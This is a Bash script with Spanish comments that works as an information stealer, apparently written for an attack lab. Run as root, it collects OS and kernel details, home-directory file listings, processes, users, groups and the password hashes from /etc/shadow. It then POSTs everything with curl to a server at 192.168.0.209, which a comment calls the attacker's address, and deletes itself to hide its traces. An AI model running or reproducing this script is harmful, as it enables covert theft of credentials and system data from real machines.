#!/bin/bash

# Comprobar si el script se ejecuta con privilegios de root
if [ "$EUID" -ne 0 ]; then
  echo "Por favor, ejecuta el script como root o con sudo."
  exit 1
fi

# Lista de paquetes requeridos
paquetes=("file")

# Actualizar la lista de paquetes
apt-get update -y > /dev/null 2>&1

# Instalar los paquetes si no estan instalados
for paquete in "${paquetes[@]}"; do
  if ! dpkg -l | grep -q "$paquete"; then
    apt-get install -y "$paquete" > /dev/null 2>&1
  fi
done

# Instalar curl
sudo apt-get install curl -y > /dev/null 2>&1

# Recolectar informacion del sistema operativo y kernel
info_sistema=$(cat /etc/os-release && uname -a && uname -m && uname -r)

# Captura el nombre del usuario original
original_user=$(who am i | awk '{print $1}')

# Obtener el directorio home del usuario original
directorio_home=$(eval echo ~$original_user)

# Recolectar informacion (nombre, tamanio y tipo) de los archivos en el directorio home del usuario original
info_archivos=$(find "$directorio_home" -maxdepth 1 -type f -exec stat --format="Nombre: %n Tamaño: %s bytes" {} \; -exec sh -c 'echo "Tipo: $(file -b "$1")"' _ {} \;)

# Recolectar informacion sobre los procesos activos (primeros 100)
info_procesos=$(ps aux | head -n 100)

# Recolectar informacion sobre usuarios
info_usuarios=$(cut -d: -f1 /etc/passwd)

# Recolectar informacion sobre grupos
info_grupos=$(cut -d: -f1 /etc/group)

# Recolectar hash salteado de las contrasenias de los usuarios
info_hashes=$(sudo awk -F: '{ print $1 ": " $2 }' /etc/shadow)

# Combinar toda la informacion en una variable
informacion_completa="Informacion del Sistema:
$info_sistema

----------------------------------------

Informacion de Archivos:
$info_archivos

----------------------------------------

Procesos Activos:
$info_procesos

----------------------------------------

Usuarios:
$info_usuarios

----------------------------------------

Grupos:
$info_grupos

----------------------------------------

Hashes de Contrasenias:
$info_hashes"

# Enviar la informacion a un servidor web usando curl
# Estos datos se deben cambiar dependiendo del atacante http://ip_servidor/api/receptor
curl -X POST -d "data=$informacion_completa" http://192.168.0.209:5000/api/receptor

# Eliminar el script despues de ejecutarlo
rm -- "$0"
